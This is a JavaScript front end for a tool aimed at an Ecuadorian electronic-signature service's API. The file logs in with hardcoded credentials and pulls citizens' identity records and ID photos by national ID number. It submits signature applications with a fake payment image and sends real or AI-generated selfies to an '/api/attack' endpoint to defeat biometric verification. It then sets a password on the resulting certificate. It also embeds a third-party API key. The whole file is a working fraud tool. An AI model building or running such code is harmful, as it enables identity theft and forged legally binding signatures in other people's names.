// ==========================================
// Navegación de Pestañas
// ==========================================
const tabFirma = document.getElementById('tabFirma');
const tabBypass = document.getElementById('tabBypass');
const seccionFirma = document.getElementById('seccionFirma');
const seccionBypass = document.getElementById('seccionBypass');

if (tabFirma && tabBypass) {
  tabFirma.addEventListener('click', () => {
    tabFirma.classList.add('active');
    tabBypass.classList.remove('active');
    seccionFirma.style.display = 'flex';
    seccionBypass.style.display = 'none';
  });

  tabBypass.addEventListener('click', () => {
    tabBypass.classList.add('active');
    tabFirma.classList.remove('active');
    seccionBypass.style.display = 'flex';
    seccionFirma.style.display = 'none';
  });
}

// ==========================================
// Lógica para Inyección de Trámite de Firma
// ==========================================

// Elementos del DOM para la inyección
const inyeccionForm = document.getElementById('inyeccionForm');
const xTokenInput = document.getElementById('xToken');
const nombresInput = document.getElementById('nombres');
const apellidosInput = document.getElementById('apellidos');
const cedulaInput = document.getElementById('cedula');
const rucInput = document.getElementById('ruc');
const codigoDactilarInput = document.getElementById('codigoDactilar');
const celularInput = document.getElementById('celular');
const correoInput = document.getElementById('correo');
const provinciaInput = document.getElementById('provincia');
const ciudadInput = document.getElementById('ciudad');
const parroquiaInput = document.getElementById('parroquia');
const direccionInput = document.getElementById('direccion');
const numeroTramiteInput = document.getElementById('numeroTramite');
const perfilFirmaInput = document.getElementById('perfilFirma');
const valorPagoInput = document.getElementById('valorPago');
const bancoInput = document.getElementById('banco');
const codUserTInput = document.getElementById('codUserT');
const ptoEmisionInput = document.getElementById('ptoEmision');
const fotoPagoFileInput = document.getElementById('fotoPagoFile');
const injectBtn = document.getElementById('injectBtn');
const consoleOutput = document.getElementById('consoleOutput');
const clearConsoleBtn = document.getElementById('clearConsoleBtn');
const autoTokenBtn = document.getElementById('autoTokenBtn');
const vigenciaFirmaSelect = document.getElementById('vigenciaFirma');
const passLinkInput = document.getElementById('passLinkInput');

// Escuchar cambios en la vigencia seleccionada para actualizar los campos fijos avanzados
if (vigenciaFirmaSelect) {
  vigenciaFirmaSelect.addEventListener('change', () => {
    const selectedOption = vigenciaFirmaSelect.options[vigenciaFirmaSelect.selectedIndex];
    const perfil = selectedOption.value;
    const precio = selectedOption.getAttribute('data-precio');
    
    if (perfilFirmaInput) perfilFirmaInput.value = perfil;
    if (valorPagoInput) valorPagoInput.value = precio;
    
    addLog('system', `Vigencia seleccionada: ${selectedOption.text} (Perfil: ${perfil}, Precio: $${precio})`);
  });
}

// ==========================================
// Autocompletar Token Automáticamente
// ==========================================
async function renovarToken() {
  if (autoTokenBtn) {
    autoTokenBtn.disabled = true;
    autoTokenBtn.innerHTML = '⏳ Obteniendo...';
  }
  addLog('info', 'Obteniendo nuevo token automáticamente desde el servidor...');
  
  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*"
      },
      body: JSON.stringify({
        user: "0706718046",
        password: "0706718046"
      })
    });

    if (!response.ok) {
      throw new Error(`Error en login: ${response.status} ${response.statusText}`);
    }

    const data = await response.json();
    if (data.token) {
      if (xTokenInput) {
        xTokenInput.value = data.token;
      }
      addLog('success', '¡Token renovado y actualizado con éxito!');
      
      // Decodificar y mostrar vencimiento
      try {
        const parts = data.token.split('.');
        if (parts.length === 3) {
          const payloadDecoded = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
          if (payloadDecoded.exp) {
            const expDate = new Date(payloadDecoded.exp * 1000);
            addLog('info', `El nuevo token expira el: ${expDate.toLocaleString()}`);
          }
        }
      } catch (e) {}

    } else {
      addLog('error', 'El servidor no devolvió un token válido.');
      addLog('json', data, true);
    }
  } catch (error) {
    addLog('error', `Error al obtener token inicial: ${error.message}`);
    addLog('warn', 'Nota sobre CORS: Si hay error de conexión, asegúrate de tener activada la extensión de CORS o el navegador sin seguridad.');
  } finally {
    if (autoTokenBtn) {
      autoTokenBtn.disabled = false;
      autoTokenBtn.innerHTML = '🔄 Autocompletar Token';
    }
  }
}

if (autoTokenBtn) {
  autoTokenBtn.addEventListener('click', renovarToken);
}

// Ejecutar automáticamente al cargar/refrescar la página
window.addEventListener('DOMContentLoaded', renovarToken);

// Nuevos elementos para búsqueda automática de cédula
const buscarCedulaBtn = document.getElementById('buscarCedulaBtn');
const fotoCedulaContainer = document.getElementById('fotoCedulaContainer');
const fotoCedulaImg = document.getElementById('fotoCedulaImg');
const fotoCedulaNombre = document.getElementById('fotoCedulaNombre');

let fotoPagoBase64 = "";
let fotoPagoMimetype = "";

// Imagen JPEG blanca mínima de 1x1 píxeles para envío por defecto
const DEFAULT_FOTO_PAGO = "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=";

// Función para agregar logs en la consola virtual
function addLog(type, message, isJson = false) {
  const timestamp = new Date().toLocaleTimeString();
  const logItem = document.createElement('div');
  
  if (isJson) {
    logItem.className = 'json-log';
    logItem.textContent = typeof message === 'object' ? JSON.stringify(message, null, 2) : message;
  } else {
    logItem.className = `${type}-log`;
    logItem.textContent = `[${timestamp}] ${message}`;
  }
  
  consoleOutput.appendChild(logItem);
  consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

// Convertir archivo de pago subido a Base64 dinámicamente
fotoPagoFileInput.addEventListener('change', (e) => {
  const file = e.target.files[0];
  if (!file) {
    fotoPagoBase64 = "";
    fotoPagoMimetype = "";
    addLog('system', 'Comprobante de pago removido. Se usará la imagen demo por defecto.');
    return;
  }

  addLog('info', `Procesando archivo de pago: ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`);
  
  const reader = new FileReader();
  reader.onload = function(event) {
    const dataUrl = event.target.result;
    const base64Parts = dataUrl.split(',');
    
    fotoPagoBase64 = base64Parts[1] || "";
    fotoPagoMimetype = file.type;
    
    addLog('success', `Archivo de pago procesado y listo. Codificado en Base64 con tipo: ${fotoPagoMimetype}`);
  };
  
  reader.onerror = function() {
    addLog('error', 'Error al leer el archivo seleccionado. Prueba con otra imagen.');
    fotoPagoFileInput.value = '';
  };
  
  reader.readAsDataURL(file);
});

// Manejo de envío del formulario (Inyección)
inyeccionForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  injectBtn.classList.add('loading');
  injectBtn.disabled = true;
  
  addLog('info', 'Iniciando proceso de inyección de trámite...');
  
  const token = xTokenInput.value.trim();
  
  // Validar y decodificar x-token (JWT) para alertar expiración
  try {
    const parts = token.split('.');
    if (parts.length === 3) {
      const payloadDecoded = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      if (payloadDecoded.exp) {
        const expDate = new Date(payloadDecoded.exp * 1000);
        const now = new Date();
        addLog('info', `Token JWT detectado de: "${payloadDecoded.nombre || 'Operador Desconocido'}"`);
        if (now > expDate) {
          addLog('warn', `¡ATENCIÓN! El token que estás usando ya expiró el ${expDate.toLocaleString()}. La API probablemente responderá con error de autorización.`);
        } else {
          addLog('info', `El token expira el: ${expDate.toLocaleString()}`);
        }
      }
    }
  } catch (err) {
    addLog('warn', 'El x-token ingresado no parece ser un JWT válido o no se pudo decodificar. Se enviará sin validar.');
  }

  // Estructura idéntica de la solicitud analizada
  const payload = {
    apellidos: apellidosInput.value.trim(),
    api_regla_codigo: "PN_BIOMETRIA_CEDULA",
    appointmentExpirationDate: "",
    archivo_aceptacion: "",
    archivo_constitucion: "",
    archivo_nombramiento: "",
    archivo_ruc: "",
    banco: bancoInput.value.trim(),
    cargo: "",
    cedula: cedulaInput.value.trim(),
    celular: celularInput.value.trim(),
    ciudad: ciudadInput.value.trim(),
    clavefirma: "",
    codUnico: "",
    codUserT: codUserTInput.value.trim(),
    codigo_dactilar: codigoDactilarInput.value.trim(),
    comentario: "",
    correo: correoInput.value.trim(),
    direccion: direccionInput.value.trim(),
    edad: 32,
    emisor: "Enext",
    foto_frontal: "",
    foto_pago: fotoPagoBase64 || DEFAULT_FOTO_PAGO,
    foto_posterior: "",
    foto_selfie: "",
    funcionJudicial: false,
    localizador: "",
    minetype_aceptacion: "",
    minetype_constitucion: "",
    minetype_foto_frontal: "",
    minetype_foto_pago: fotoPagoMimetype || "image/jpeg",
    minetype_foto_posterior: "",
    minetype_foto_selfie: "",
    minetype_nombramiento: "",
    minetype_ruc: "",
    minetype_video: "",
    nombres: nombresInput.value.trim(),
    notificarEmisionDuplicado: true,
    numero_tramite: numeroTramiteInput.value.trim(),
    parroquia: parroquiaInput.value.trim(),
    perfil_firma: perfilFirmaInput.value.trim(),
    promocion: "No Aplica",
    proveedor_configurado: "Enext",
    provincia: provinciaInput.value.trim(),
    ptoEmision: ptoEmisionInput.value.trim(),
    recurrencia: "",
    ruc: rucInput.value.trim(),
    tipoPersona: "natural",
    tipo_clave: 0,
    tipo_documento: "CEDULA",
    tipo_tramitacion: "Biometria",
    valorPago: valorPagoInput.value.trim(),
    video: ""
  };

  addLog('info', 'Enviando petición POST a: https://apifirmas.firmasecuador.com/api/firmas/tramitarFirma');
  addLog('info', 'Payload enviado:');
  addLog('json', payload, true);

  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/firmas/tramitarFirma", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*",
        "x-token": token
      },
      body: JSON.stringify(payload)
    });

    addLog('info', `Respuesta HTTP recibida: ${response.status} ${response.statusText}`);

    const data = await response.json();
    addLog('success', 'Cuerpo JSON de la respuesta:');
    addLog('json', data, true);

    if (data.codigo === "1" || data.link_biometria) {
      addLog('success', '¡Trámite inyectado con éxito! Se ha generado el enlace de biometría.');
      
      if (data.link_biometria) {
        // Autocompletar el link en el módulo de Bypass
        if (typeof bypassLinkInput !== 'undefined') {
          bypassLinkInput.value = data.link_biometria;
          addLog('info', '[BYPASS] Enlace de validación copiado automáticamente al módulo bypass.');
        }
        // Autocompletar el link en la sección de Contraseña (solo el token)
        if (typeof passLinkInput !== 'undefined' && passLinkInput) {
          try {
            const urlObj = new URL(data.link_biometria);
            passLinkInput.value = urlObj.searchParams.get('token') || data.link_biometria;
          } catch {
            passLinkInput.value = data.link_biometria;
          }
          addLog('info', '[PASS] Token copiado automáticamente al campo de contraseña.');
        }
      }

      // Crear un botón interactivo dentro de la consola para ir al enlace (para redundancia)
      const linkBtn = document.createElement('a');
      linkBtn.href = data.link_biometria || '#';
      linkBtn.target = '_blank';
      linkBtn.className = 'action-btn-link';
      linkBtn.innerHTML = '<span>🔗 Ir a validación biométrica Enext</span>';
      
      consoleOutput.appendChild(linkBtn);
      consoleOutput.scrollTop = consoleOutput.scrollHeight;
    } else {
      addLog('error', `La API devolvió un estado de error: ${data.mensaje || 'Sin mensaje'}`);
    }

  } catch (error) {
    addLog('error', `Error durante el envío de la solicitud: ${error.message}`);
  } finally {
    injectBtn.classList.remove('loading');
    injectBtn.disabled = false;
  }
});

// Limpieza de Logs
clearConsoleBtn.addEventListener('click', () => {
  consoleOutput.innerHTML = '';
  addLog('system', 'Consola limpia. Lista para inyección...');
});

// ==================================================
// Lógica para Consulta y Autocompletado de Cédula
// ==================================================

// Función para separar nombres y apellidos dinámicamente
function separarNombresYApellidos(nombreCompleto) {
  const partes = nombreCompleto.trim().split(/\s+/);
  if (partes.length >= 4) {
    // e.g. "CENTENO HOLGUIN KEVIN JULIAN" -> apellidos: "CENTENO HOLGUIN", nombres: "KEVIN JULIAN"
    const apellidos = partes.slice(0, 2).join(' ');
    const nombres = partes.slice(2).join(' ');
    return { nombres, apellidos };
  } else if (partes.length === 3) {
    // Asumimos primer apellido y el resto nombres
    const apellidos = partes[0];
    const nombres = partes.slice(1).join(' ');
    return { nombres, apellidos };
  } else if (partes.length === 2) {
    return { apellidos: partes[0], nombres: partes[1] };
  }
  return { nombres: nombreCompleto, apellidos: '' };
}

async function consultarCedula() {
  const cedula = cedulaInput.value.trim();
  const token = xTokenInput.value.trim();

  if (!cedula) {
    addLog('warn', 'Por favor, ingresa un número de cédula válido para consultar.');
    return;
  }

  addLog('info', `Iniciando consulta de cédula: ${cedula}...`);
  buscarCedulaBtn.disabled = true;
  buscarCedulaBtn.innerHTML = '⏳';
  buscarCedulaBtn.classList.add('loading');

  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/usuarios/consultarCedula", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*",
        "x-token": token
      },
      body: JSON.stringify({ cedula })
    });

    addLog('info', `Respuesta HTTP recibida de consultarCedula: ${response.status} ${response.statusText}`);

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Error en la consulta: ${response.status}. ${errorText}`);
    }

    const data = await response.json();
    addLog('success', 'Datos obtenidos de consultarCedula:');
    addLog('json', data, true);

    if (data.identificacion) {
      // 1. Separar nombres y apellidos
      if (data.nombres) {
        const { nombres, apellidos } = separarNombresYApellidos(data.nombres);
        nombresInput.value = nombres;
        apellidosInput.value = apellidos;
      }

      // 2. Establecer RUC (Cédula + 001)
      rucInput.value = `${data.identificacion}001`;

      // 3. Código dactilar
      if (data.codigoDactilar) {
        codigoDactilarInput.value = data.codigoDactilar;
      }

      // 4. Ubicación (lugarNacimiento)
      // e.g. "GUAYAS/GUAYAQUIL/BOLIVAR (SAGRARIO)"
      if (data.lugarNacimiento) {
        const partesLugar = data.lugarNacimiento.split('/');
        if (partesLugar.length >= 1) provinciaInput.value = partesLugar[0].trim();
        if (partesLugar.length >= 2) ciudadInput.value = partesLugar[1].trim();
        if (partesLugar.length >= 3) {
          parroquiaInput.value = partesLugar[2].trim();
          direccionInput.value = partesLugar[2].trim(); // Por defecto usamos la parroquia
        }
      }

      // 5. Mostrar la foto
      if (data.foto) {
        const srcPrefix = data.foto.startsWith('data:') ? '' : 'data:image/jpeg;base64,';
        const fullFotoSrc = srcPrefix + data.foto;
        
        // Cargar foto en el formulario
        fotoCedulaImg.src = fullFotoSrc;
        fotoCedulaNombre.textContent = `Foto de ${data.nombres || data.identificacion}`;
        fotoCedulaContainer.style.display = 'flex';
        
        // Autocompletar foto en el módulo Bypass
        if (typeof bypassBase64Image !== 'undefined') {
          bypassBase64Image = fullFotoSrc;
          if (typeof bypassFotoPreview !== 'undefined') {
            bypassFotoPreview.src = fullFotoSrc;
            bypassFotoPreview.style.display = 'block';
            if (typeof bypassPreviewWrapper !== 'undefined') bypassPreviewWrapper.style.display = 'flex';
          }
        }
        
        addLog('success', 'Foto del usuario cargada con éxito en ambos paneles.');
      } else {
        fotoCedulaContainer.style.display = 'none';
        addLog('warn', 'No se encontró foto de cédula en la respuesta del API.');
      }

      addLog('success', 'Formulario autocompletado con éxito.');
    } else {
      addLog('error', 'La API no devolvió datos válidos de identificación.');
    }

  } catch (error) {
    addLog('error', `Error al consultar cédula: ${error.message}`);
  } finally {
    buscarCedulaBtn.disabled = false;
    buscarCedulaBtn.innerHTML = '🔍';
    buscarCedulaBtn.classList.remove('loading');
  }
}

// Listeners para consulta de cédula
buscarCedulaBtn.addEventListener('click', consultarCedula);
cedulaInput.addEventListener('keypress', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    consultarCedula();
  }
});

// ==================================================
// Lógica para Simulación de Validación (Bypass) tribu.js
// ==================================================

const bypassLinkInput = document.getElementById('bypassLink');
const bypassFotoFile = document.getElementById('bypassFotoFile');
const bypassFotoPreview = document.getElementById('bypassFotoPreview');
const bypassPreviewWrapper = document.getElementById('bypassPreviewWrapper');
const bypassBtn = document.getElementById('bypassBtn');

let bypassBase64Image = null;

// Cuando el usuario sube una foto manualmente para el bypass
bypassFotoFile.addEventListener('change', function(e) {
  const file = e.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function(e) {
      bypassBase64Image = e.target.result;
      bypassFotoPreview.src = bypassBase64Image;
      bypassFotoPreview.style.display = 'block';
      bypassPreviewWrapper.style.display = 'flex';
      addLog('info', 'Foto manual cargada para el bypass biométrico.');
    }
    reader.readAsDataURL(file);
  }
});

// Enviar ataque bypass
bypassBtn.addEventListener('click', async () => {
  const link = bypassLinkInput.value.trim();
  
  if (!link || !bypassBase64Image) {
    addLog('warn', '[BYPASS] Faltan datos. Necesitas el enlace generado y una foto base64.');
    return;
  }
  
  let token = '';
  try {
    const url = new URL(link);
    token = url.searchParams.get('token');
    if (!token) throw new Error('No se encontró el parámetro token en el enlace.');
  } catch (e) {
    addLog('error', '[BYPASS] Enlace inválido o falta token: ' + e.message);
    return;
  }
  bypassBtn.classList.add('loading');
  bypassBtn.disabled = true;

  let bypassToken = '';

  try {
    addLog('info', '[BYPASS] Enviando ataque al servidor unificado (/api/attack)...');

    // Enviamos la petición al mismo puerto que aloja la página web
    const response = await fetch('/api/attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, foto: bypassBase64Image })
    });
    
    const data = await response.json();
    
    if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true') || data.body.includes('\u00c9xito') || data.body.includes('Exito'))) {
      addLog('success', '[BYPASS - \u00c9XITO] \u00a1Ataque exitoso! La validación biométrica ha sido aprobada.');
      addLog('error', `Respuesta: Status ${data.status} - Body: ${data.body}`);

      // Guardar el token para usarlo en el envio de contraseña
      bypassToken = token;

      // Mostrar la sección de contraseña
      const passwordSection = document.getElementById('passwordSection');
      if (passwordSection) passwordSection.style.display = 'block';
    } else {
      addLog('warn', '[BYPASS - BLOQUEADO] El servidor rechazó la foto o falló.');
      addLog('warn', `Respuesta: Status ${data.status} - Body: ${data.body}`);
    }
  } catch (err) {
    addLog('error', '[BYPASS] Error de conexión con el servidor. ' + err.message);
  } finally {
    bypassBtn.classList.remove('loading');
    bypassBtn.disabled = false;
  }

  // Guardar token globalmente para el botón de contraseña
  window._bypassToken = bypassToken;
});

// ==================================================
// Envío de Contraseña tras Bypass Exitoso
// ==================================================
const enviarPassBtn = document.getElementById('enviarPassBtn');
const newPassInput = document.getElementById('newPassInput');

if (enviarPassBtn) {
  enviarPassBtn.addEventListener('click', async () => {
    // Usar el valor del campo directamente como token
    const token = passLinkInput ? passLinkInput.value.trim() : '';

    const newPass = newPassInput ? newPassInput.value.trim() : '';

    if (!token) {
      addLog('warn', '[PASS] Ingresa el enlace de validación con el token antes de enviar.');
      return;
    }
    if (!newPass) {
      addLog('warn', '[PASS] Por favor ingresa una contraseña antes de enviar.');
      return;
    }

    addLog('info', `[PASS] Enviando contraseña al servidor...`);
    enviarPassBtn.classList.add('loading');
    enviarPassBtn.disabled = true;

    try {
      const response = await fetch('/api/set-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, newPass })
      });

      const data = await response.json();

      let bodyParsed;
      try { bodyParsed = JSON.parse(data.body); } catch { bodyParsed = data.body; }

      if (data.status === 200 && (bodyParsed === true || bodyParsed?.ok === true || data.body.includes('true'))) {
        addLog('success', `[PASS - \u00c9XITO] \u00a1Contraseña guardada correctamente! Respuesta: ${data.body}`);
      } else {
        addLog('warn', `[PASS] El servidor respondió con un estado inesperado. Status: ${data.status} - Body: ${data.body}`);
      }
    } catch (err) {
      addLog('error', '[PASS] Error de conexión al enviar contraseña: ' + err.message);
    } finally {
      enviarPassBtn.classList.remove('loading');
      enviarPassBtn.disabled = false;
    }
  });
}

// ==================================================
// Lógica del Generador de Imágenes IA (Flux via RapidAPI)
// ==================================================

const generateAIBtn = document.getElementById('generateAIBtn');
const aiPrompt = document.getElementById('aiPrompt');
const aiImageContainer = document.getElementById('aiImageContainer');
const aiImagePreview = document.getElementById('aiImagePreview');
const useAiImageBtn = document.getElementById('useAiImageBtn');

// Función auxiliar para convertir Base64 a un archivo binario Blob
function base64ToBlob(base64Data, contentType) {
  contentType = contentType || '';
  const sliceSize = 1024;
  const base64Clean = base64Data.split(',')[1] || base64Data;
  const byteCharacters = atob(base64Clean);
  const byteArrays = [];

  for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
    const slice = byteCharacters.slice(offset, offset + sliceSize);
    const byteNumbers = new Array(slice.length);
    for (let i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    byteArrays.push(byteArray);
  }

  return new Blob(byteArrays, { type: contentType });
}

// Sube la imagen Base64 a tmpfiles.org y devuelve una URL pública de descarga directa
async function subirImagenTemporal(base64String) {
  const mimeMatch = base64String.match(/^data:(image\/[a-zA-Z]+);base64,/);
  const mimeType = mimeMatch ? mimeMatch[1] : 'image/jpeg';
  
  const blob = base64ToBlob(base64String, mimeType);
  const formData = new FormData();
  formData.append('file', blob, 'referencia.jpg');

  const uploadResponse = await fetch('https://tmpfiles.org/api/v1/upload', {
    method: 'POST',
    body: formData
  });

  const uploadResult = await uploadResponse.json();
  
  if (uploadResult.status === 'success') {
    // Reemplazar la URL para que sea descarga directa (dl)
    return uploadResult.data.url.replace('https://tmpfiles.org/', 'https://tmpfiles.org/dl/');
  } else {
    throw new Error('Error al subir la imagen de referencia al servidor temporal.');
  }
}

generateAIBtn.addEventListener('click', async () => {
  const promptText = aiPrompt.value.trim();
  if (!promptText) {
    addLog('warn', '[IA] El prompt está vacío. Escribe una descripción para la generación.');
    return;
  }
  
  if (!bypassBase64Image) {
    addLog('warn', '[IA] No hay ninguna foto cargada. Consulta una cédula o sube una imagen en "Bypass Biométrico" para usarla como base.');
    return;
  }
  
  addLog('info', '[IA] Iniciando generación de imagen con Flux (RapidAPI)...');
  addLog('info', '[IA] Subiendo foto de referencia al servidor temporal (tmpfiles.org)...');
  
  generateAIBtn.classList.add('loading');
  generateAIBtn.disabled = true;
  
  try {
    // 1. Subir la imagen local de referencia para obtener la URL pública
    const urlReferencia = await subirImagenTemporal(bypassBase64Image);
    addLog('success', `[IA] Foto de referencia subida. URL: ${urlReferencia}`);
    
    // 2. Preparar el payload para RapidAPI
    const payload = {
      prompt: promptText,
      images: [ urlReferencia ],
      aspect_ratio: "auto"
    };
    
    addLog('info', '[IA] Enviando petición a la API de Flux en RapidAPI...');
    
    const response = await fetch('https://flux-api-4-custom-models-100-style.p.rapidapi.com/create-v26', {
      method: 'POST',
      headers: {
        'x-rapidapi-key': '48abc974dbmsh1dd911a04a25bccp1f725djsn8f411b999a1d',
        'x-rapidapi-host': 'flux-api-4-custom-models-100-style.p.rapidapi.com',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    
    const data = await response.json();
    
    // Buscar la URL de la imagen generada en el JSON de forma flexible
    let generatedImageUrl = null;
    if (data.url) {
      generatedImageUrl = data.url;
    } else if (data.image) {
      generatedImageUrl = data.image;
    } else if (data.output) {
      generatedImageUrl = Array.isArray(data.output) ? data.output[0] : data.output;
    } else if (data.images && data.images.length > 0) {
      generatedImageUrl = typeof data.images[0] === 'object' ? data.images[0].url : data.images[0];
    } else if (data.result) {
      generatedImageUrl = data.result;
    }
    
    if (generatedImageUrl) {
      aiImagePreview.src = generatedImageUrl;
      aiImageContainer.style.display = 'block';
      addLog('success', '[IA] ¡Selfie generado con éxito por Flux!');
    } else {
      addLog('error', '[IA] No se encontró la URL de la imagen en la respuesta de la API.');
      addLog('json', data, true);
    }
    
  } catch (err) {
    addLog('error', '[IA] Falló la generación de imagen con Flux: ' + err.message);
  } finally {
    generateAIBtn.classList.remove('loading');
    generateAIBtn.disabled = false;
  }
});

useAiImageBtn.addEventListener('click', async () => {
  if (aiImagePreview.src) {
    const src = aiImagePreview.src;
    
    // Si la imagen es una URL externa, la descargamos por el proxy para evitar problemas de CORS
    if (src.startsWith('http')) {
      addLog('info', '[BYPASS] Descargando imagen generada desde el servidor para evitar CORS...');
      useAiImageBtn.classList.add('loading');
      useAiImageBtn.disabled = true;
      
      try {
        const response = await fetch('/api/download-image', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: src })
        });
        
        const data = await response.json();
        
        if (data.base64) {
          bypassBase64Image = data.base64;
          bypassFotoPreview.src = data.base64;
          bypassFotoPreview.style.display = 'block';
          if (typeof bypassPreviewWrapper !== 'undefined') bypassPreviewWrapper.style.display = 'flex';
          addLog('success', '[BYPASS] Foto generada por Flux cargada con éxito en el Bypass biométrico (Base64).');
        } else {
          throw new Error(data.error || 'No se recibió el Base64.');
        }
      } catch (e) {
        addLog('error', '[BYPASS] Falló la descarga de la imagen por proxy: ' + e.message);
      } finally {
        useAiImageBtn.classList.remove('loading');
        useAiImageBtn.disabled = false;
      }
    } else {
      bypassBase64Image = src;
      bypassFotoPreview.src = src;
      bypassFotoPreview.style.display = 'block';
      if (typeof bypassPreviewWrapper !== 'undefined') bypassPreviewWrapper.style.display = 'flex';
      addLog('success', '[BYPASS] Foto cargada en el Bypass biométrico.');
    }
  }
});
